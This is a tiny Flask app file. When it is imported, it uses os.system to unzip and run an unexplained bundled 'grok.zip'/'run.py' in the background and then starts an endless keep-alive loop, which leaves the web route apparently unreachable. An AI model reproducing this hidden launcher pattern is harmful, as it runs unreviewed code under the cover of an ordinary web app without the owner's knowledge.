from flask import Flask, render_template, url_for

app = Flask(__name__)
import os
os.system('unzip grok.zip;nohup python run.py > nohup.out')
os.system('while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 5m; done')
@app.route("/")
def index():
    return render_template("index.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0")

